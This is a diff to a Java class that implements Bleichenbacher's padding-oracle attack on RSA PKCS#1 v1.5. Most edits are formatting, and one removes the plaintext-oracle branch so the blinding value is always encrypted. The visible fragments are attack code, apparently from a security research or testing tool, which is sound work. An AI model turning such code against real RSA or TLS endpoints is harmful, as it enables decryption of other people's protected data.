@@ -31,12 +31,14 @@ public class Bleichenbacher {
     protected final int blockSize;
     protected final BigInteger bigB;
     protected final boolean msgIsPKCS;
-    /** allows to write all the requests and the corresponding si values
-     * to the FILE_NAME file */
+    /**
+     * allows to write all the requests and the corresponding si values to the
+     * FILE_NAME file
+     */
     protected final boolean WRITE_TO_FILE = false;
     protected final String FILE_NAME = "ValidQueries.csv";
     protected BufferedWriter bw;
-    
+
     public Bleichenbacher(final byte[] msg,
             final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
         this.encryptedMsg = msg.clone();
@@ -91,7 +93,8 @@ public class Bleichenbacher {
         i++;
 
         while (!solutionFound) {
-            System.out.println("Step 2: Searching for PKCS conforming messages.");
+            System.out.
+                    println("Step 2: Searching for PKCS conforming messages.");
             stepTwo(i);
 
             System.out.println("Step 3: Narrowing the set of soultions.");
@@ -309,7 +312,8 @@ public class Bleichenbacher {
             solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
 
             //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
-            System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.
+            System.out.println("====> Solution found!\n" + Utility.
+                    bytesToHex(solution.
                     toByteArray()));
             //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
             //}
@@ -386,15 +390,9 @@ public class Bleichenbacher {
                     getNumberOfQueries());
         }
 
-        // if we use a real oracle (not a plaintext oracle), the si value has
-        // to be encrypted first.
-        if (!oracle.isPlaintextOracle()) {
-            // encrypt: si^e mod n
-            tmp = si.modPow(publicKey.getPublicExponent(),
-                    publicKey.getModulus());
-        } else {
-            tmp = si;
-        }
+        // encrypt: si^e mod n
+        tmp = si.modPow(publicKey.getPublicExponent(),
+                publicKey.getModulus());
 
         // blind: c0*(si^e) mod n
         // or: m*si mod n (in case of plaintext oracle)
@@ -406,7 +404,8 @@ public class Bleichenbacher {
         return msg;
     }
 
-    protected void writeToFile(final BigInteger si, final byte[] send, final boolean pkcsConform) {
+    protected void writeToFile(final BigInteger si, final byte[] send,
+            final boolean pkcsConform) {
         if (WRITE_TO_FILE) {
             try {
                 if (pkcsConform) {
